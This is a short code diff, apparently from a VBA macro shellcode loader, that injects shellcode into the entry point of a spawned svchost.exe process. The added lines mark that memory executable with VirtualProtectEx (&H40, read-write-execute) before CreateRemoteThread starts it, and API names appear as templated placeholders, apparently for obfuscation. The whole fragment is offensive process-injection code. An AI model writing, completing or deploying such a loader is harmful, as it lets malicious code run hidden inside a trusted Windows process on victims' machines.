@@ -86,6 +86,9 @@ End Type
     ' Write the shellcode into the svchost.exe entry point
     a = {WriteProcessMemory}(pi.hProcess, addr, buf(0), scSize, tmp)
 
+    Dim oldProtect as Long
+    res = {VirtualProtectEx}(pi.hProcess, addr, UBound(shellcode), &H40, oldProtect)
+
     Dim thread as LongPtr
     thread = {CreateRemoteThread}(pi.hProcess, ByVal 0&, 0, addr, ByVal 0&, 0, ByVal 0&)
 
